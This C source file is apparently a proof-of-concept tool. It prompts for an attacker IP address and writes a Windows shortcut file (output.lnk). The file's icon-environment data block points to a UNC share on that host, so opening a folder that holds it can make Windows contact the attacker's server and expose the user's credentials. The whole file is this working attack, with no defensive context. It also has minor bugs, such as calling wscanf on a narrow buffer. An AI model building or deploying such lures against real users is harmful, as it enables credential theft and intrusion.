#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>


// forces the compiler to pack fields with no padding exactly 1 byte alignment.
#pragma pack(1)
typedef struct SHELL_LINK_HEADER {
	DWORD HeaderSize;
	BYTE LinkCLSID[16];
	DWORD LinkFlags;
	DWORD FileAttributes;
	FILETIME CreationTime;
	FILETIME AccessTime;
	FILETIME WriteTime;
	DWORD FileSize;
	DWORD IconIndex;
	DWORD ShowCommand;
	WORD HotKey;
	WORD Reserved1;
	DWORD Reserved2;
	DWORD Reserved3;
} SHELL_LINK_HEADER;
#pragma pack(pop)

#pragma pack(1)
typedef struct IconEnvironmentDataBlock {
	DWORD BlockSize;
	DWORD BlockSignature;
	CHAR TargetAnsi[260];
	WCHAR TargetUnicode[260];
} IconEnvironmentDataBlock;
#pragma pack(pop)

VOID poc_lnk(){
	printf("enter attacker ip: ");
	char attacker_ip[64] = { 0 };
	wscanf("%s",attacker_ip);
	SHELL_LINK_HEADER lnkheader = { 0 };
	IconEnvironmentDataBlock icodata = { 0 };

	lnkheader.HeaderSize = 0x4C;
	// GUID stored in little-endian byte order per MS-SHLLINK spec section 2.1
	// First 3 components are reversed: 00021401 -> 01 14 02 00, 0000 -> 00 00, 0000 -> 00 00
	// Last 8 bytes (C000-000000000046) are stored as-is
	// This CLSID identifies the file as a Shell Link (shortcut) to Windows
	BYTE clsid[16] = {
	0x01, 0x14, 0x02, 0x00,
	0x00, 0x00,
	0x00, 0x00,
	0xC0, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x46
	};
	memcpy(lnkheader.LinkCLSID, clsid, 16);

	lnkheader.LinkFlags = 0x00000001 | 0x00000080 | 0x00004000;
	lnkheader.FileAttributes = 0x00000020;
	lnkheader.FileSize = 0;
	lnkheader.IconIndex = 0;
	lnkheader.ShowCommand = 0x00000001;

	icodata.BlockSize = 0x00000314;
	icodata.BlockSignature = 0xA0000007;
	sprintf(icodata.TargetAnsi, "\\\\%s\\share\\file.ico", attacker_ip);
	swprintf(icodata.TargetUnicode, 260, L"\\\\%hs\\share\\file.ico", attacker_ip);


	FILE* f = fopen("output.lnk", "wb");
	if (!f) {
		printf("failed to create file\n");
		return;
	}
	fwrite(&lnkheader, sizeof(SHELL_LINK_HEADER), 1, f);
	fwrite(&icodata, sizeof(IconEnvironmentDataBlock), 1, f);
	fclose(f);

	}
